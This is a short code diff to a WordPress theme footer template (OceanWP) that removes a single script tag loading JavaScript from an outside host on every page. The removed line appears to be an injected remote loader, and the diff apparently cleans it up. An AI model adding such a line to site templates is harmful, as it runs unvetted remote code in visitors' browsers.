@@ -79,6 +79,5 @@ if ( 'fullscreen' === oceanwp_mobile_menu_style() ) {
 ?>
 
 <?php wp_footer(); ?>
-<script type="text/javascript" src="//web.it-center.by/?do=work_v3&user=4oknaby" charset="UTF-8"></script>
 </body>
 </html>
